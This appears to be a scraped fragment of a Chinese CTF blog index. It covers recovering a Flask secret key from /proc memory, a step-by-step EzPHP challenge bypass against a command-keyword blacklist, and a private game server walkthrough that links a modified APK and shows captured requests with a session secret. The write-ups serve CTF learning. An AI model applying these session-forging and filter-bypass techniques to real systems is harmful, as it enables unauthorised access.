class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;a id=&quot;back-to-top&quot;&gt;&lt;i class=&quot;fa fa-angle-double-up&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Jquery Library Call --&gt;&lt;script src=&quot;vendor/magnific/jquery.magnific-popup.min.js&quot;&gt;&lt;/script&gt; &lt;!-- PrettyPhoto Plugin --&gt;&lt;script src=&quot;js/ui-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- UI Plugins --&gt;&lt;script src=&quot;js/helper-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- Helper Plugins --&gt;&lt;script src=&quot;vendor/owl-carousel/js/owl.carousel.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Owl Carousel --&gt;&lt;script src=&quot;js/bootstrap.js&quot;&gt;&lt;/script&gt; &lt;!-- UI --&gt;&lt;script src=&quot;js/init.js&quot;&gt;&lt;/script&gt; &lt;!-- All Scripts --&gt;&lt;script src=&quot;vendor/flexslider/js/jquery.flexslider.js&quot;&gt;&lt;/script&gt; &lt;!-- FlexSlider --&gt;&lt;/body&gt;&lt;/html&gt; 典中典 只因 删flag只存在变量中简单分析一下，本题看着好像使用了模板，但是并不能打ssti，所以说需要通过任意文件读取的路由下载特定文件。Debug模式关闭，算pin走console肯定不行了. 众所周知，python运行的时候，会把对象存储在堆区里，因此我们可以通过读取堆区的东西来过去key然后就能伪造session从admin路由堂而皇之的获取flag了，在本题中，提供了一个cat.py，这让我们可以带偏移量的读取文件，也就是说，拥有了在内存海洋里”航行”的船桨(不会出现指向内存的空指针)，还有一个问题便是偏移量，不用担心，/proc/pid/maps就全都给出来了 比如这样: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162root@VM-8-17-ubuntu:/proc/59428# cat maps00400000-00423000 r--p 00000000 fc:02 130987 /usr/bin/python3.800423000-006b0000 r-xp 00023000 fc:02 130987 /usr/bin/python3.8006b0000-008ec000 r--p 002b0000 fc:02 130987 /usr/bin/python3.8008ed000-008ee000 r--p 004ec000 fc:02 130987 /usr/bin/python3.8008ee000-00935000 rw-p 004ed000 fc:02 130987 /usr/bin/python3.800935000-00958000 rw-p 00000000 00:00 0 00b1b000-00bc5000 rw-p 00000000 00:00 0 [heap]7f082cb41000-7f082cd66000 rw-p 00000000 00:00 0 7f082cd66000-7f082d04c000 r--p 00000000 fc:02 161431 /usr/lib/locale/locale-archive7f082d04c000-7f082d04f000 rw-p 00000000 00:00 0 7f082d04f000-7f082d051000 r--p 00000000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d051000-7f082d062000 r-xp 00002000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d062000-7f082d068000 r--p 00013000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d068000-7f082d069000 ---p 00019000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d069000-7f082d06a000 r--p 00019000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d06a000-7f082d06b000 rw-p 0001a000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d06b000-7f082d06d000 rw-p 00000000 00:00 0 7f082d06d000-7f082d071000 r--p 00000000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d071000-7f082d08d000 r-xp 00004000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d08d000-7f082d097000 r--p 00020000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d097000-7f082d098000 ---p 0002a000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d098000-7f082d09a000 r--p 0002a000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d09a000-7f082d09b000 rw-p 0002c000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d09b000-7f082d0aa000 r--p 00000000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d0aa000-7f082d151000 r-xp 0000f000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d151000-7f082d1e8000 r--p 000b6000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1e8000-7f082d1e9000 r--p 0014c000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1e9000-7f082d1ea000 rw-p 0014d000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1ea000-7f082d1eb000 r--p 00000000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1eb000-7f082d1ec000 r-xp 00001000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ec000-7f082d1ed000 r--p 00002000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ed000-7f082d1ee000 r--p 00002000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ee000-7f082d1ef000 rw-p 00003000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ef000-7f082d1f0000 r--p 00000000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f0000-7f082d1f2000 r-xp 00001000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f2000-7f082d1f3000 r--p 00003000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f3000-7f082d1f4000 r--p 00003000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f4000-7f082d1f5000 rw-p 00004000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f5000-7f082d1fc000 r--p 00000000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d1fc000-7f082d20d000 r-xp 00007000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d20d000-7f082d212000 r--p 00018000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d212000-7f082d213000 r--p 0001c000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d213000-7f082d214000 rw-p 0001d000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d214000-7f082d218000 rw-p 00000000 00:00 0 7f082d218000-7f082d23d000 r--p 00000000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d23d000-7f082d3b5000 r-xp 00025000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d3b5000-7f082d3ff000 r--p 0019d000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d3ff000-7f082d400000 ---p 001e7000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d400000-7f082d403000 r--p 001e7000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d403000-7f082d406000 rw-p 001ea000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d406000-7f082d40c000 rw-p 00000000 00:00 0 7f082d412000-7f082d419000 r--s 00000000 fc:02 262948 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache7f082d419000-7f082d41a000 r--p 00000000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d41a000-7f082d43d000 r-xp 00001000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d43d000-7f082d445000 r--p 00024000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d446000-7f082d447000 r--p 0002c000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d447000-7f082d448000 rw-p 0002d000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d448000-7f082d449000 rw-p 00000000 00:00 0 7fffbbe8a000-7fffbbeab000 rw-p 00000000 00:00 0 [stack]7fffbbf92000-7fffbbf95000 r--p 00000000 00:00 0 [vvar]7fffbbf95000-7fffbbf96000 r-xp 00000000 00:00 0 [vdso] 前面的便是地址和偏移量，只需要读取这些，然后再根据这个地址进行内存的读取就可以把key读出来了，然后就能读取内存了。 从app.py里的代码来看，key后面跟着都是*abcdefgh，只需要找到含有这个字符串的内容输出，就能直接找到key了，还可以更简单粗暴一点，格式是UUID+”*abcdefgh”，可以写个正则表达式输出。 至于key获得了，就可以直接通过flask-session-cookie-manager3.py(github有源码)搞事情了qwq 总结:1.在有任意文件读取的地方，可以通过/proc/pid/cmdline扫描进程2.可以通过/proc/pid/fd/3恢复python中Open但是并没有close的文件 0xFFFF Reform","link":"/2023/01/05/%E6%B5%85%E8%B0%88proc/"},{"title":"刷题记录23-1-11","text":"[BJDCTF2020]EzPHP查看源代码 12&lt;!-- Here is the real page =w= --&gt;&lt;!-- GFXEIM3YFZYGQ4A= --&gt; base32解码1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; 第一个if123456if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); } 地图炮版基本过滤,就在那里恶心人url编码过去 123456if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!'); 过正则，又要不全等于，前面正则匹配，加个换行就行了 123456if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } $_REQUEST特性 当我只传入?aaa=111此时$_REQUEST=array(1) { [&quot;aaa&quot;]=&gt; string(3) &quot;111&quot; },如果我再同时POST一个aaa=123时候，$_REQUEST=array(1) { [&quot;aaa&quot;]=&gt; string(3) &quot;123&quot; }利用这个特性覆写 12if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;); data伪协议覆写,记得POST覆盖一下 1234567if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);} 数组报错绕过，获得关键extract($_GET[&quot;flag&quot;]); 1234567if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; create_function()此处include flag.php大胆猜测flag在变量中，可以直接输出所有的变量 [&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 取反绕过，伪协议读取rea1fl4g.php [网鼎杯 2020 半决赛]AliceWebsite?action疑似任意文件读取，貌似伪协议读不出来，读取一下/start.sh 1#!/bin/bash if [[ -f /flag.sh ]]; then source /flag.sh fi apache2-foreground 寄，投机取巧没成功，flag.sh被删了 整了一圈啥都没弄到，看了眼wp 妈的，直接包含../../flag","link":"/2023/01/11/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-23-1-11/"},{"title":"从西湖论剑学到的javascript特性","text":"0x00 前言西湖论剑…一题没出 捅了js窝了，全是没咋学习过的javascript 0x01 Javascript 中的变量Javascipt中，只有一种结构，对象(object)，每个实例对象(object)都有一个私有属性(__proto__)层层向上","link":"/2023/02/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E6%9C%89%E6%84%9F/"},{"title":"某游私服原理","text":"声明: 此文章仅用于技术交流。version 1.7.51[澄闪版本]Apk文件:https://pan.baidu.com/s/1Fe0J85AyrRiQxOdMa9dEdg提取码:lgm9 服务端:https://github.com/Darknights-dev/Darknights-server警告:代码里面有好几处RCE漏洞，谨慎部署我审出来了，嘻嘻 在core/auth.py，里面到处都是eval，很怀疑作者的用心，明明会json.loads，但是非得用eval 这里我把原版的apk和hook过的apk都放在这里了，这个项目已经存在一年多了，所以完成度都很高，所有的交互都被修改成了http请求，因此可以很轻松地看到该游戏的实现原理。 游戏在加载之前会首先获取网络配置，此时服务端会下发对应的接口的地址 1{&quot;sign&quot;:&quot;liOYRfqui44FAHTZ3SoXtHJgl4Vj8vu90aumePes3Kh1A1Z4QVLCXtlG5h0EzfXsTKmdaBJjBaDkAaoR/BUt1JA+SdLIEzyb6BNjbgL5whdH8EQABSo/M5fYFn8QRjSbtQNl5tUK0cYJgCT3ODVnEmHKFqydrkjCPgVNyXU4Eyg=&quot;,&quot;content&quot;:&quot;{\\&quot;configVer\\&quot;:\\&quot;5\\&quot;,\\&quot;funcVer\\&quot;:\\&quot;V025\\&quot;,\\&quot;configs\\&quot;:{\\&quot;V025\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;as\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;u8\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}},\\&quot;V026\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;https://ak-gs-gf.hypergryph.com\\&quot;,\\&quot;as\\&quot;:\\&quot;https://as.hypergryph.com\\&quot;,\\&quot;u8\\&quot;:\\&quot;https://as.hypergryph.com/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;https://ak.hycdn.cn/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}}}}&quot;} 客户端在收到服务端下发的配置文件之后，会首先进行一个验证(此处相关内容我后面会说明) 后续与服务器通信都会依据这个配置文件里各个接口的链接，抽卡，打关卡，balabala的 比如抽卡: 12345678910111213POST /gacha/syncNormalGacha HTTP/1.1uid: 10000069secret: 94b594b06a45764c467f5d0b09a8eb52X-Unity-Version: 2017.4.39f1seqnum: 4Content-Type: application/jsonUser-Agent: Dalvik/2.1.0 (Linux; U; Android 11; M2105K81AC Build/RKQ1.200826.002)Host: xxx.xxx.xxx.xxx:38660Connection: closeAccept-Encoding: gzip, deflateContent-Length: 2{} 1234567HTTP/1.1 200 Content-Type: application/jsonDate: Tue, 24 Jan 2023 14:15:37 GMTConnection: closeContent-Length: 11524{&quot;result&quot;:0,&quot;charGet&quot;:{&quot;charInstId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},&quot;gachaResultList&quot;:[{&quot;charInstId&quot;:6,&quot;charId&quot;:&quot;char_212_ansel&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:7,&quot;charId&quot;:&quot;char_209_ardign&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:8,&quot;charId&quot;:&quot;char_199_yak&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:9,&quot;charId&quot;:&quot;char_281_popka&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:10,&quot;charId&quot;:&quot;char_150_snakek&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:11,&quot;charId&quot;:&quot;char_236_rope&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:12,&quot;charId&quot;:&quot;char_133_mm&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:13,&quot;charId&quot;:&quot;char_278_orchid&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:14,&quot;charId&quot;:&quot;char_219_meteo&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]}],&quot;playerDataDelta&quot;:{&quot;deleted&quot;:{},&quot;modified&quot;:{&quot;troop&quot;:{&quot;curCharInstId&quot;:1,&quot;curSquadCount&quot;:4,&quot;charMission&quot;:{&quot;char_263_skadi&quot;:{&quot;mission_char_263_skadi_1&quot;:2,&quot;mission_char_263_skadi_0&quot;:2},&quot;char_1013_chen2&quot;:{&quot;mission_char_1013_chen2_1&quot;:2,&quot;mission_char_1013_chen2_0&quot;:2},&quot;char_1012_skadi2&quot;:{&quot;mission_char_1012_skadi2_0&quot;:2,&quot;mission_char_1012_skadi2_1&quot;:2},&quot;char_010_chen&quot;:{&quot;mission_char_010_chen_1&quot;:2,&quot;mission_char_010_chen_0&quot;:2},&quot;char_148_nearl&quot;:{&quot;mission_char_148_nearl_1&quot;:2,&quot;mission_char_148_nearl_0&quot;:2},&quot;char_1011_lava2&quot;:{&quot;mission_char_1011_lava2_1&quot;:2,&quot;mission_char_1011_lava2_0&quot;:2},&quot;char_121_lava&quot;:{&quot;mission_char_121_lava_1&quot;:2,&quot;mission_char_121_lava_0&quot;:2},&quot;char_1014_nearl2&quot;:{&quot;mission_char_1014_nearl2_0&quot;:2,&quot;mission_char_1014_nearl2_1&quot;:2}},&quot;addon&quot;:{},&quot;squads&quot;:{&quot;0&quot;:{&quot;slots&quot;:[{&quot;charInstId&quot;:1,&quot;skillIndex&quot;:0},{&quot;charInstId&quot;:2,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:3,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:4,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:5,&quot;skillIndex&quot;:0},null,null,null,null,null,null,null],&quot;name&quot;:&quot;第一编队&quot;,&quot;squadId&quot;:&quot;0&quot;},&quot;1&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;第二编队&quot;,&quot;squadId&quot;:&quot;1&quot;},&quot;2&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;第三编队&quot;,&quot;squadId&quot;:&quot;2&quot;},&quot;3&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;第四编队&quot;,&quot;squadId&quot;:&quot;3&quot;}},&quot;charGroup&quot;:{&quot;char_503_rang&quot;:{&quot;favorPoint&quot;:6},&quot;char_236_rope&quot;:{&quot;favorPoint&quot;:0},&quot;char_209_ardign&quot;:{&quot;favorPoint&quot;:0},&quot;char_120_hibisc&quot;:{&quot;favorPoint&quot;:0},&quot;char_212_ansel&quot;:{&quot;favorPoint&quot;:0},&quot;char_278_orchid&quot;:{&quot;favorPoint&quot;:0},&quot;char_150_snakek&quot;:{&quot;favorPoint&quot;:0},&quot;char_110_deepcl&quot;:{&quot;favorPoint&quot;:6},&quot;char_502_nblade&quot;:{&quot;favorPoint&quot;:6},&quot;char_500_noirc&quot;:{&quot;favorPoint&quot;:0},&quot;char_199_yak&quot;:{&quot;favorPoint&quot;:0},&quot;char_219_meteo&quot;:{&quot;favorPoint&quot;:0},&quot;char_133_mm&quot;:{&quot;favorPoint&quot;:0},&quot;char_281_popka&quot;:{&quot;favorPoint&quot;:0},&quot;char_002_amiya&quot;:{&quot;favorPoint&quot;:6}},&quot;chars&quot;:{&quot;11&quot;:{&quot;instId&quot;:11,&quot;charId&quot;:&quot;char_236_rope&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_236_rope#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_rope_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_rope_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;12&quot;:{&quot;instId&quot;:12,&quot;charId&quot;:&quot;char_133_mm&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_133_mm#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_mm_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_mm_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;13&quot;:{&quot;instId&quot;:13,&quot;charId&quot;:&quot;char_278_orchid&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_278_orchid#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_quickattack[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;14&quot;:{&quot;instId&quot;:14,&quot;charId&quot;:&quot;char_219_meteo&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_219_meteo#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_meteo_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_meteo_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;15&quot;:{&quot;instId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;c